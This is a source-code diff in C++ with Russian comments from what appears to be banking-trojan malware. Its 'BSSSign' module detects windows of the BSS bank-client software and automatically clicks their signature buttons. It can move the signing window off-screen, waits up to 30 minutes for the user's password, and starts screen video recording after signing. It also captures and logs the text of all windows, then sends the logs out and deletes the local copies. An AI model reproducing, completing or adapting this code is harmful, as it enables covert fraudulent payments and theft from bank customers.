@@ -88,7 +88,7 @@ namespace BSSSign
 		string *Path = (string*)aPath;
 
 		//Отправляем логи
-		VideoRecorderSendPath(Path->t_str(), NULL, NULL, 0);
+		VideoRecorder::SendFiles(*Path);
 
 		// Удаляем файлы
 		DeleteFolders(Path->t_str());
@@ -203,6 +203,26 @@ namespace BSSSign
 			if (ScreenWnd)
 				MakeWndScreenShot(ScreenWnd);
 		}
+		//------------------------------------------------------------------
+
+		void AddTextFile(const char* LogLine, const char* Data, DWORD DataLen)
+		{
+			// Функция добавляет в лог текстовый файл
+			if (!DataLen)
+				DataLen = STRA::Length(Data);
+			if (!DataLen) return;
+
+			// Содаём имя файла
+			FScreensCount++;
+			string Name;
+			Name.Format("TextLog%d.txt", FScreensCount);
+			string FileName = FWorkPath + Name;
+
+			File::WriteBufferA(FileName.t_str(), (LPVOID)Data, DataLen);
+			Name.Format("---> <TextLog%d> [%s]", FScreensCount, LogLine);
+			Write(NULL, false, Name.t_str());
+        }
+
 
 		//------------------------------------------------------------------
 		void Close()
@@ -265,8 +285,60 @@ inline void BSSSignLogTemplate(SCREENWND ScreenWnd, MAKEFULLSCREEN MakeScreen, M
 
 
 
-
 //----------------------------------------------------------------------------
+HWND BSSSearchButtons(HWND Form, bool OneButton, DWORD BtnCaptionHash, TBotList* Buttons)
+{
+	HWND Result = NULL;
+	HWND Button = NULL;
+	do
+	{
+		Button = (HWND)pFindWindowExA(Form, Button, NULL, NULL);
+		if (Button == NULL) break;
+
+		DWORD Hash = GetWndText2(Button).Hash();
+
+		// Проверяем заголовок кнопки
+		if (Hash != BtnCaptionHash)
+		{
+			Result = BSSSearchButtons(Button, OneButton, BtnCaptionHash, Buttons);
+		}
+		else
+		{
+			Result = Button;
+			if (Buttons)
+				Buttons->Add(Button);
+		}
+
+		if (Result && OneButton)
+			break;
+	}
+	while (true);
+
+    return Result;
+}
+//----------------------------------------------------------------------------
+
+bool BSSClickToButton(HWND Button)
+{
+	// Функция кликает по указанному окну
+	DWORD X = Random::Generate(2, 30);
+	DWORD Y = Random::Generate(2, 10);
+
+	BSSSIGNLOG(NULL, false, "Кликаем по кнопке [%d][%s]", Button, GetWndText2(Button).t_str());
+	BSSSIGNLOG(NULL, false, "Координаты %d, %d", X, Y);
+
+	bool Result = HardClickToWindow(Button, X, Y);
+	if (Result)
+	{
+		BSSSIGNLOG(NULL, false, "Новый текст кнопки: [%s] \r\n\r\n", GetWndText2(Button).t_str());
+
+		pSleep(Random::Generate(1000, 1500));
+	}
+
+    return Result;
+}
+//----------------------------------------------------------------------------
+
 DWORD  BSSClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash)
 {
 	// Перебираем дочерние окна определённого класса и заголовка
@@ -293,16 +365,17 @@ DWORD  BSSClickToButtons(HWND Form, bool MultiClick, DWORD BtnCaptionHash)
 
 		// Кликаем по кнопке
 		DWORD X = Random::Generate(2, 30);
-        DWORD Y = Random::Generate(2, 10);
+		DWORD Y = Random::Generate(2, 10);
+
+		BSSSIGNLOG(NULL, false, "Кликаем по кнопке [%d][%s]", Button, Text.t_str());
+		BSSSIGNLOG(NULL, false, "Координаты %d, %d", X, Y);
+
 		if (HardClickToWindow(Button, X, Y))
 		{
-			BSSSIGNLOG(NULL, false, "Кликаем по кнопке [%d][%s]", Button, Text.t_str());
-			BSSSIGNLOG(NULL, false, "Координаты %d, %d", X, Y);
+			BSSSIGNLOG(NULL, false, "Новый текст кнопки: [%s] \r\n\r\n", GetWndText2(Button).t_str());
 
 			Count++;
 			pSleep(Random::Generate(1000, 1500));
-
-            BSSSIGNLOG(NULL, false, "Новый текст кнопки: [%s] \r\n\r\n", GetWndText2(Button).t_str());
 
 			if (!MultiClick) break;
         }
@@ -383,6 +456,11 @@ public:
 	}
 	//------------------------------------------------------------------------
 
+	bool IsValid()
+	{
+		// Функция возвращает истину если окно валидно и отображается
+		return (BOOL)pIsWindow(FForm) != FALSE;
+    }
 };
 
 //***********************************************
@@ -391,12 +469,48 @@ public:
 class TBSSSignForm : public TBSSForm
 {
 protected:
-    bool FCloseBtnClicked;
+	bool     FCloseBtnClicked;
+	int      FClickedCount;
+	int      FWindowsCount;
+	bool     FWaitWindow;
+	TBotList FButtons;
+
 	// Кликаем по кнопкам установки подписи
 	bool Click()
 	{
-		DWORD Count = BSSClickToButtons(FForm, true, BSS_SIGN_BUTTON_CAPTION_HASH);
-		BDBG("bsssign","Подпись завершена. Нажато кнопок %d", Count);
+//		DWORD Count = BSSClickToButtons(FForm, true, BSS_SIGN_BUTTON_CAPTION_HASH);
+		if (FWaitWindow)
+		{
+			// Объект находится в режиме ожидания закрытия окна
+			FWaitWindow = Owner()->Count() > FWindowsCount;
+			if (FWaitWindow) return false;
+        }
+		// Сохраняем количество открытых окон
+		FWindowsCount = Owner()->Count();
+
+		while (FButtons.Count())
+		{
+			HWND Wnd = (HWND)FButtons.GetItem(0);
+			FButtons.Delete(0);
+
+			if (BSSClickToButton(Wnd))
+			{
+				FClickedCount++;
+
+				if (Owner()->Count() > FWindowsCount)
+				{
+					// после нажатия на кнопку было отображено
+					// ещё одно окно, переходим в режим ожидания закрытия
+					FWaitWindow = true;
+					return false;
+                }
+			}
+        }
+
+
+
+		BDBG("bsssign","Подпись завершена. Нажато кнопок %d", FClickedCount);
+
 		TBSSForm::Click();
 
 
@@ -406,12 +520,12 @@ protected:
 			Проблема в том, что из бота определить, что полпись успешно
 			поставлена
 		*/
-        if (Count)
+        if (FClickedCount)
 			VideoRecorderSrv::StartInfiniteRecording("BSS");
 
 		//---------------------------------------------
 
-        return Count > 0;
+        return FClickedCount > 0;
     }
 
 	// Функция проверяет статус окна установки подписей
@@ -426,8 +540,13 @@ public:
 	TBSSSignForm(TBSSClicker* aOwner, HWND Wnd)
 		: TBSSForm(aOwner, Wnd)
 	{
-		BDBG("bsssign","Перехвачено окно установки подписей");
-		BSSSIGNLOG(Wnd, false, "Обрабатываем окно установки подписей");
+		// Определяем списко кнопок по которым необходимо кликнуть
+		FClickedCount = 0;
+		FWaitWindow   = false;
+        BSSSearchButtons(Wnd, false, BSS_SIGN_BUTTON_CAPTION_HASH, &FButtons);
+
+		BDBG("bsssign","Перехвачено окно установки подписей. Подписей %d", FButtons.Count());
+		BSSSIGNLOG(Wnd, false, "Обрабатываем окно установки подписей. Подписей %d", FButtons.Count());
 		#ifdef BSSSIGN_HIDE_WND
             Move(-1000, 0);
 		#endif
@@ -473,14 +592,14 @@ public:
 		// Для окно ввода пароля будем просто ожидать ввода
 		BDBG("bsssign","Перехвачено окно ввода пароля");
 		BSSSIGNLOG(Wnd, false, "Окно ввода пароля");
-    	FMaxWaitInterval = 3 * 60 * 1000;
+    	FMaxWaitInterval = 30 * 60 * 1000;
 	}
 
     // Проверяем является ли окно окном ввода пароля
 	bool static IsPasswordForm(TBSSClicker* Clicker, HWND WND, const string& Text)
 	{
 		// Этап первый: Окно должно быть диалогом, не иметь родителя.
-		if (((TBotCollection*)Clicker)->Count() == 0 || pGetParent(WND) != NULL)
+		if (((TBotCollection*)Clicker)->Count() == 0)
 			return false;
 
 		// Этап второй: проверяем вхождение слова пароль
@@ -554,6 +673,20 @@ private:
 	friend DWORD WINAPI BSSClickerThreadMethod(LPVOID Clicker);
 
 
+	void CheckForm()
+	{
+		// Функция проверяет валидность окон
+		TLock Locker = GetLocker();
+
+		for (int i = Count() - 1; i >= 0; i--)
+		{
+			TBSSForm* Form = (TBSSForm*)Items(i);
+			if (!Form->IsValid())
+				delete Form;
+        }
+	}
+	//-------------------------------------------------------------------
+
 	// Функция кликает по окнам системы BSS
 	void Execute()
 	{
@@ -562,6 +695,8 @@ private:
 
 		do
 		{
+			CheckForm();
+
 			for (int i = 0; i < Count();)
 			{
 				TBSSForm* Form = (TBSSForm*)Items(i);
@@ -577,14 +712,12 @@ private:
 
 			// Проверяем необходимость завершения
 			TLock L = GetLocker();
-			FRunning = Count() > 0;
+			FRunning = Count() > 0 && FActive;
             if (!FRunning) break;
 		}
 		while (true);
 	}
     //------------------------------------------------------------------------
-
-
 
 
 public:
@@ -604,10 +737,22 @@ public:
 	}
 	//------------------------------------------------------------------------
 
+	bool IsDialog(HWND Wnd)
+	{
+		// Функция возвращает истину если окно является диалоговым окном
+
+		HWND Owner = (HWND)pGetWindow(Wnd, GW_OWNER);
+
+		// Наличие окна владельца предполагает, что окно является диалоговым
+        return Owner != NULL;
+	}
+	//------------------------------------------------------------------------
+
     // Добавляем форму для клика
 	bool AddForm(HWND WND)
 	{
-        if (!FActive) return false;
+		if (!FActive || !IsDialog(WND))
+			return false;
 
 		string Text      = GetWndText2(WND);
 		string Class     = GetWndClassName2(WND);
@@ -630,10 +775,26 @@ public:
 		if (TBSSErrorForm::IsErrorForm(this, ClassHash, TextHash))
 			Form = new TBSSErrorForm(this, WND);
 
+		// Логируем информацию об окне
+		#ifdef LOG_BSS_SIGN
+			if (Logger && !Text.IsEmpty())
+			{
+				// Получаем надписи всех окон
+				PCHAR WndText = GetAllWindowsText(WND, true, true);
+				if (WndText)
+				{
+					Logger->Write(NULL, false, "Отображается окно: ");
+                    Logger->AddTextFile(Text.t_str(), WndText, 0);
+					STR::Free(WndText);
+                }
+			}
+		#endif
+
 
 		if (!Form) return false;
 
         BSSSIGNLOG(NULL, false, "Обрабатываем форму [%s]", Text.t_str());
+
 
 		// Запускаем поток
 		TLock L = GetLocker();
